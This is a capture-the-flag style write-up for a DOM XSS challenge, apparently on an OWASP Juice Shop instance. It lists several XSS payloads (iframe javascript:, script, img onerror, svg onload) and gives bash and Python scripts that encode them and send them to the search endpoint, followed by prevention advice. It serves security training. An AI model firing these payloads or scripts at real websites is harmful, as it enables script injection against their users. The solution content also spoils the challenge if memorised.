# Challenge 2: DOM XSS

## Difficulty: ⭐ (1/5)

## Objective
Perform a DOM XSS attack by exploiting the search functionality.

## Vulnerability
The search functionality doesn't properly sanitize user input before reflecting it in the DOM, allowing JavaScript execution.

## Solution

### Manual Steps:
1. Go to the main page
2. Click on the search box (magnifying glass icon)
3. Enter the following payload:
   ```html
   <iframe src="javascript:alert('XSS')">
   ```
4. Press Enter to search
5. The XSS will trigger and the challenge is complete

### Alternative Payloads:
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag with onerror -->
<img src=x onerror="alert('XSS')">

<!-- SVG payload -->
<svg onload="alert('XSS')">

<!-- iframe payload (most reliable for Juice Shop) -->
<iframe src="javascript:alert('XSS')">
```

## Automated Script:
```bash
#!/bin/bash
# save as: dom_xss.sh

TARGET="https://juice3.wonkatech.org"

echo "💉 Executing DOM XSS attack..."

# The search parameter is 'q'
PAYLOAD='<iframe src="javascript:alert(`XSS`)">'

# URL encode the payload
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()))")

# Construct the attack URL
ATTACK_URL="${TARGET}/#/search?q=${ENCODED_PAYLOAD}"

echo "🎯 Attack URL prepared:"
echo "$ATTACK_URL"
echo ""
echo "📋 To complete the challenge:"
echo "1. Copy and paste this URL in your browser"
echo "2. Or manually search for: $PAYLOAD"

# Alternatively, trigger via curl (won't complete challenge but tests vulnerability)
curl -s "${TARGET}/rest/products/search?q=${ENCODED_PAYLOAD}" > /dev/null 2>&1
echo "✅ XSS payload sent to search endpoint"
```

## Python Automation:
```python
#!/usr/bin/env python3
# save as: challenge_02_dom_xss.py

import requests
from urllib.parse import quote

def perform_dom_xss(base_url):
    """Perform DOM XSS attack via search"""
    
    print(f"🎯 Challenge 2: DOM XSS on {base_url}")
    
    # XSS payloads to try
    payloads = [
        '<iframe src="javascript:alert(`XSS`)">',
        '<img src=x onerror="alert(1)">',
        '<script>alert("XSS")</script>',
        '<svg onload="alert(1)">'
    ]
    
    for payload in payloads:
        # URL encode the payload
        encoded_payload = quote(payload)
        
        # Construct attack URL
        attack_url = f"{base_url}/#/search?q={encoded_payload}"
        
        print(f"💉 Payload: {payload}")
        print(f"🔗 Attack URL: {attack_url}")
        
        # Test the search API endpoint
        try:
            api_url = f"{base_url}/rest/products/search?q={encoded_payload}"
            response = requests.get(api_url)
            
            if response.status_code == 200:
                print(f"✅ Payload accepted by server")
                
                # Check if payload is reflected
                if payload in response.text or encoded_payload in response.text:
                    print(f"⚠️  Payload reflected in response - XSS likely!")
                    break
        except Exception as e:
            print(f"Error: {e}")
    
    print("\n📋 To complete the challenge:")
    print("1. Navigate to the search page")
    print(f"2. Enter: {payloads[0]}")
    print("3. Or visit the attack URL in your browser")
    
    return attack_url

if __name__ == "__main__":
    # Replace with your instance
    BASE_URL = "https://juice3.wonkatech.org"
    perform_dom_xss(BASE_URL)
```

## Why It Works
- The search functionality takes user input from the `q` parameter
- This input is inserted into the DOM without proper sanitization
- The browser interprets and executes our JavaScript payload
- Modern frameworks should escape user input by default, but Juice Shop intentionally has this vulnerability

## Prevention
To prevent DOM XSS:
- Always encode/escape user input before inserting into HTML
- Use Content Security Policy (CSP) headers
- Use framework's built-in sanitization functions
- Validate and sanitize input on both client and server side

## Learning Points
- DOM XSS occurs when JavaScript code processes untrusted data
- Search functions are common XSS vectors
- Always test various payload formats as some may be filtered